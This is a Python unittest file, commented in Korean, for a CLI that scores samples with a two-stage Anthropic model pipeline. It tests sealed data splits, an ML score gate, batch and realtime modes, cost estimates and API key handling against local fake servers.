    def test_sealed_parts_are_refused_until_opened(self):
        for part, ids in (("test", ["t"]), ("reserve", ["r"])):
            with self.subTest(part):
                with self.assertRaises(L.split.SealedError):
                    self.check(part, ids)
        with open(self.ledger, "w", encoding="utf-8") as f:
            json.dump([{"part": "test"}], f)
        self.check("test", ["t"])  # 연 기록이 있으면 통과

    def test_input_must_belong_to_the_named_part(self):
        self.check("train", ["a"])
        self.check("calibration", ["c"])
        with self.assertRaises(ValueError):
            self.check("train", ["a", "t"])  # 봉인 표본을 다른 구간 이름으로 들여오지 못한다
        with self.assertRaises(ValueError):
            self.check("train", ["nowhere"])


class CliMeasure(CliBase):
    """측정 경로: 기본 배치 · 기본 ML 관문 · 봉인 거부."""

    def setUp(self):
        super().setUp()
        self.ml = os.path.join(self.dir.name, "ml-train.jsonl")
        write_jsonl(self.ml, [{"id": "s0", "p": 0.2}, {"id": "s1", "p": 0.5}, {"id": "s2", "p": 0.35}])
        self.gate = ["--ml", self.ml, "--band-low", "0.2", "--band-high", "0.5"]

    def test_measurement_defaults_to_batches_and_the_ml_gate(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train"] + self.gate, client=client)
        self.assertEqual(code, 0, err)
        self.assertEqual([len(reqs) for _, reqs in client.batches.created], [2])
        self.assertEqual({i: r["status"] for i, r in L.Results(self.out).rows.items()}, {"s0": "OK", "s1": "NOT_GATED", "s2": "OK"})
        self.assertNotIn("s0", err)

    def test_the_gate_needs_the_ml_file_and_both_bounds(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        for argv in ([], ["--ml", self.ml], ["--ml", self.ml, "--band-low", "0.2"], ["--ml", self.ml, "--band-low", "0.5", "--band-high", "0.2"]):
            with self.subTest(argv=argv):
                code, _, _, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train"] + argv, client=client)
                self.assertEqual(code, 2)
        self.assertEqual((client.calls, client.batches.created), ([], []))

    def test_another_band_on_the_same_results_file_is_refused(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train"] + self.gate, client=client)
        calls = len(client.calls)
        moved = ["--ml", self.ml, "--band-low", "0.1", "--band-high", "0.5"]
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train"] + moved, client=client)
        self.assertEqual((code, len(client.calls)), (2, calls))
        self.assertIn("관문", err)

    def test_sealed_part_is_refused_before_anything_else(self):
        write_jsonl(self.inp, [{"id": "t0", "text": TEXT, "static": STATIC}])
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        code, _, err, make = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "test", "--gate", "all"], client=client)
        self.assertEqual(code, 2)
        self.assertIn("봉인", err)
        make.assert_not_called()
        self.assertFalse(os.path.exists(self.out))
        # 봉인 표본을 학습 구간 이름으로 넣어도 거부한다
        code, _, _, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train", "--gate", "all"], client=client)
        self.assertEqual((code, client.calls), (2, []))

    def test_no_wait_submits_and_a_later_run_collects(self):
        server = FakeBatches(ends_after=1)
        client = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        argv = ["run", "--input", self.inp, "--out", self.out, "--part", "train", "--no-wait"] + self.gate
        code, _, err, _ = self.run_cli(argv, client=client)
        self.assertEqual(code, 4, err)
        code, _, err, _ = self.run_cli(argv, client=FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server))
        self.assertEqual(code, 0, err)
        self.assertEqual(len(server.created), 1)
        self.assertEqual({r["status"] for r in L.Results(self.out).rows.values()}, {"OK", "NOT_GATED"})

    def test_realtime_refuses_while_batches_are_pending(self):
        server = FakeBatches(ends_after=9)
        client = FakeClient({HAIKU: lambda request: message(analysis(5))}, server=server)
        self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train", "--no-wait"] + self.gate, client=client)
        code, _, err, _ = self.run_cli(["run", "--input", self.inp, "--out", self.out, "--part", "train", "--mode", "realtime"] + self.gate,
                                       client=client)
        self.assertEqual(code, 2)
        self.assertEqual(len(client.calls), 0)

    def test_estimate_counts_the_gate_and_prices_the_worst_case_at_batch_rates(self):
        code, out, _, make = self.run_cli(["estimate", "--input", self.inp] + self.gate, key=None)
        make.assert_not_called()
        report = json.loads(out)
        self.assertEqual((code, report["samples"], report["gated"], report["notGated"], report["priceMode"]), (0, 3, 2, 1, "batch"))
        prompt = L.load_prompt()
        worst = 0.0
        for row in samples(3)[0], samples(3)[2]:
            user = L.render_user(prompt, row["text"], row["static"], False)
            for model in (HAIKU, OPUS):
                worst += L.worst_case_usd(model, L.bound_input_tokens(L.build_request(model, prompt, user)), batch=True)
        self.assertAlmostEqual(report["worstUsd"]["total"], round(worst, 4), places=4)
        self.assertAlmostEqual(report["worstUsd"]["withRetries"], round(worst * TRIES, 4), places=4)
        self.assertEqual(report["budgetUsd"], 100.0)
        _, realtime, _, _ = self.run_cli(["estimate", "--input", self.inp, "--mode", "realtime"] + self.gate, key=None)
        self.assertAlmostEqual(json.loads(realtime)["worstUsd"]["total"], round(2 * worst, 4), places=4)


@NEEDS_SDK
class Sdk(unittest.TestCase):
    """공식 SDK 가 이 요청 모양을 받아들이고, 돌아온 답을 이 코드가 읽는지 — 127.0.0.1 의 가짜 서버로만."""

    def test_client_goes_to_the_official_api_even_if_the_environment_names_a_relay(self):
        with mock.patch.dict(os.environ, {"ANTHROPIC_BASE_URL": "https://relay.invalid"}):
            client = L.make_client(FAKE_KEY)
        self.assertEqual(str(client.base_url).rstrip("/"), "https://api.anthropic.com")
        self.assertEqual(L.OFFICIAL_BASE_URL, "https://api.anthropic.com")
        self.assertNotIn(FAKE_KEY, repr(client))

    def test_request_keys_are_parameters_of_the_sdk_calls(self):
        client = L.make_client(FAKE_KEY)
        prompt = L.load_prompt()
        request = L.build_request(OPUS, prompt, L.render_user(prompt, TEXT, STATIC, False))
        self.assertLessEqual(set(request), set(inspect.signature(client.messages.stream).parameters))
        self.assertLessEqual(set(L.count_request(request)), set(inspect.signature(client.messages.count_tokens).parameters))
        # 배치 한 건의 params 는 스트리밍 아닌 Messages 요청 모양이어야 한다
        from anthropic.types.message_create_params import MessageCreateParamsNonStreaming as Params
        self.assertLessEqual(set(request), Params.__required_keys__ | Params.__optional_keys__)
        self.assertIn("requests", inspect.signature(client.messages.batches.create).parameters)

    def test_batches_end_to_end_through_the_sdk_against_a_local_server(self):
        seen, store = [], {}
        reply = {"id": "msg_b", "type": "message", "role": "assistant", "model": HAIKU,
                 "content": [{"type": "thinking", "thinking": "", "signature": "sig"},
                             {"type": "text", "text": json.dumps(analysis(12), ensure_ascii=False)}],
                 "stop_reason": "end_turn", "stop_sequence": None,
                 "usage": {"input_tokens": 900, "output_tokens": 321, "cache_creation_input_tokens": 1500, "cache_read_input_tokens": 0}}

        class Api(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def batch(self, batch_id, ended):
                port = self.server.server_address[1]
                return {"id": batch_id, "type": "message_batch", "processing_status": "ended" if ended else "in_progress",
                        "request_counts": {"processing": 0 if ended else 1, "succeeded": 1 if ended else 0, "errored": 0, "canceled": 0, "expired": 0},
                        "created_at": "2026-11-13T00:00:00Z", "expires_at": "2026-11-14T00:00:00Z",
                        "ended_at": "2026-11-13T00:01:00Z" if ended else None, "archived_at": None, "cancel_initiated_at": None,
                        "results_url": f"http://127.0.0.1:{port}/v1/messages/batches/{batch_id}/results" if ended else None}

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                seen.append(("POST", self.path.split("?")[0], body))
                store["msgbatch_e2e"] = body["requests"]
                self.reply("application/json", json.dumps(self.batch("msgbatch_e2e", False)).encode())

            def do_GET(self):
                path = self.path.split("?")[0]
                seen.append(("GET", path, None))
                if path.endswith("/results"):
                    lines = [json.dumps({"custom_id": r["custom_id"], "result": {"type": "succeeded", "message": reply}}) for r in store["msgbatch_e2e"]]
                    return self.reply("application/binary", ("\n".join(lines) + "\n").encode())
                self.reply("application/json", json.dumps(self.batch("msgbatch_e2e", True)).encode())

            def reply(self, kind, payload):
                self.send_response(200)
                self.send_header("Content-Type", kind)
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

        try:
            server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Api)
        except OSError as e:
            self.skipTest(f"127.0.0.1 에 가짜 서버를 띄우지 못함: {e}")
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)

        with tempfile.TemporaryDirectory() as d, mock.patch.dict(os.environ, {"NO_PROXY": "127.0.0.1", "no_proxy": "127.0.0.1"}):
            client = L.make_client(FAKE_KEY, base_url=f"http://127.0.0.1:{server.server_address[1]}")
            results = L.Results(os.path.join(d, "out.jsonl"))
            done, _ = batches(samples(1), client, results)
            row = L.Results(results.path).rows["s0"]
        self.assertEqual(done["stopped"], None)
        self.assertEqual((row["status"], row["riskScore"], row["rationaleKo"]), ("OK", 12, analysis()["rationale_ko"]))
        self.assertAlmostEqual(row["costUsd"], 0.5 * (900 * 0.10 + 321 * 0.50 + 1500 * 0.125) / 1e6, places=8)
        (method, path, body), = [x for x in seen if x[0] == "POST"]
        self.assertEqual(path, "/v1/messages/batches")
        (request,) = body["requests"]
        self.assertNotIn("stream", request["params"])
        self.assertEqual(request["params"]["output_config"]["format"]["schema"], L.ANALYSIS_SCHEMA)

    def test_sdk_error_classes_are_described_without_their_text(self):
        import httpx2
        req = httpx2.Request("POST", "https://api.anthropic.com/v1/messages")
        status = L.anthropic.RateLimitError(f"slow down {FAKE_KEY}", response=httpx2.Response(429, request=req), body=None)
        self.assertEqual(L.describe_error(status)[:7], "api 429")
        self.assertNotIn(FAKE_KEY, L.describe_error(status))
        dropped = L.anthropic.APITimeoutError(request=req)
        self.assertTrue(L.describe_error(dropped).startswith("connection"))

    def test_end_to_end_through_the_sdk_against_a_local_server(self):
        seen = []

        def sse(model, text, *, stop="end_turn", details=None, start_usage, out_tokens):
            events = [("message_start", {"type": "message_start", "message": {
                "id": "msg_test", "type": "message", "role": "assistant", "model": model, "content": [],
                "stop_reason": None, "stop_sequence": None, "usage": start_usage}})]
            if text is not None:
                events += [
                    ("content_block_start", {"type": "content_block_start", "index": 0, "content_block": {"type": "thinking", "thinking": "", "signature": ""}}),
                    ("content_block_delta", {"type": "content_block_delta", "index": 0, "delta": {"type": "signature_delta", "signature": "sig"}}),
                    ("content_block_stop", {"type": "content_block_stop", "index": 0}),
                    ("content_block_start", {"type": "content_block_start", "index": 1, "content_block": {"type": "text", "text": ""}}),
                    ("content_block_delta", {"type": "content_block_delta", "index": 1, "delta": {"type": "text_delta", "text": text[:20]}}),
                    ("content_block_delta", {"type": "content_block_delta", "index": 1, "delta": {"type": "text_delta", "text": text[20:]}}),
                    ("content_block_stop", {"type": "content_block_stop", "index": 1}),
                ]
            delta = {"stop_reason": stop, "stop_sequence": None}
            if details:
                delta["stop_details"] = details
            events += [("message_delta", {"type": "message_delta", "delta": delta, "usage": {"output_tokens": out_tokens}}),
                       ("message_stop", {"type": "message_stop"})]
            return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events).encode()

        class Api(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                seen.append((self.path.split("?")[0], {k.lower(): v for k, v in self.headers.items()}, body))
                if self.path.split("?")[0].endswith("/count_tokens"):
                    return self.reply("application/json", json.dumps({"input_tokens": 1234}).encode())
                refuse = "REFUSE-ME" in body["messages"][0]["content"]
                if refuse:
                    payload = sse(body["model"], None, stop="refusal", out_tokens=0,
                                  details={"type": "refusal", "category": "cyber", "explanation": "declined"},
                                  start_usage={"input_tokens": 700, "output_tokens": 0})
                elif body["model"] == HAIKU:
                    payload = sse(HAIKU, json.dumps(analysis(55), ensure_ascii=False), out_tokens=321,
                                  start_usage={"input_tokens": 900, "cache_creation_input_tokens": 1500, "cache_read_input_tokens": 0, "output_tokens": 1})
                else:
                    payload = sse(OPUS, json.dumps(analysis(91), ensure_ascii=False), out_tokens=654,
                                  start_usage={"input_tokens": 900, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 1500, "output_tokens": 1})
                self.reply("text/event-stream", payload)

            def reply(self, kind, payload):
                self.send_response(200)
                self.send_header("Content-Type", kind)
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

        try:
            server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Api)
        except OSError as e:
            self.skipTest(f"127.0.0.1 에 가짜 서버를 띄우지 못함: {e}")
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)

        with mock.patch.dict(os.environ, {"NO_PROXY": "127.0.0.1", "no_proxy": "127.0.0.1"}):
            client = L.make_client(FAKE_KEY, base_url=f"http://127.0.0.1:{server.server_address[1]}")
            row = one(client)
            refused = one(client, "s2", text=TEXT + "# REFUSE-ME\n")
            prompt = L.load_prompt()
            counted = L.counted_input_tokens(client, L.build_request(HAIKU, prompt, L.render_user(prompt, TEXT, STATIC, False)))

        # 답: 1단계 55 → 2단계 91, 토큰 · 비용은 usage 그대로
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", OPUS, 91))
        s1, s2 = row["stages"]
        self.assertEqual((s1["inputTokens"], s1["outputTokens"], s1["cacheReadTokens"], s1["cacheWriteTokens"]), (900, 321, 0, 1500))
        self.assertEqual((s2["inputTokens"], s2["outputTokens"], s2["cacheReadTokens"], s2["cacheWriteTokens"]), (900, 654, 1500, 0))
        self.assertAlmostEqual(row["costUsd"], (900 * 0.10 + 321 * 0.50 + 1500 * 0.125 + 900 * 4.00 + 654 * 20.00 + 1500 * 0.20) / 1e6, places=8)
        self.assertEqual((refused["status"], refused["error"]), ("REFUSED", "refusal:cyber"))
        self.assertEqual([s.get("billed") for s in refused["stages"]], [False, False])
        self.assertEqual(counted, math.ceil(1234 * 1.05) + 256)

        # 보낸 것: SDK 가 실제로 만든 요청 본문
        posts = [(path, headers, body) for path, headers, body in seen if path == "/v1/messages"]
        self.assertEqual([body["model"] for _, _, body in posts], [HAIKU, OPUS, HAIKU, OPUS])
        path, headers, body = posts[0]
        self.assertTrue(any(FAKE_KEY in value for value in headers.values()))  # 키는 인증 머리글로만 간다(이름은 SDK 판마다 다르다)
        self.assertNotIn(FAKE_KEY, json.dumps(body))
        self.assertIn("anthropic-version", headers)
        self.assertIs(body["stream"], True)
        self.assertEqual(body["max_tokens"], L.MAX_TOKENS)
        self.assertEqual(body["system"][0]["cache_control"], {"type": "ephemeral"})
        self.assertEqual(body["thinking"], {"type": "adaptive"})
        self.assertEqual(body["output_config"], {"effort": L.EFFORT[HAIKU], "format": {"type": "json_schema", "schema": L.ANALYSIS_SCHEMA}})
        self.assertEqual(set(body), {"model", "max_tokens", "system", "messages", "thinking", "output_config", "stream"})
        count_path, _, count_body = [x for x in seen if x[0].endswith("/count_tokens")][0]
        self.assertEqual(count_path, "/v1/messages/count_tokens")
        self.assertNotIn("max_tokens", count_body)


if __name__ == "__main__":
    unittest.main()
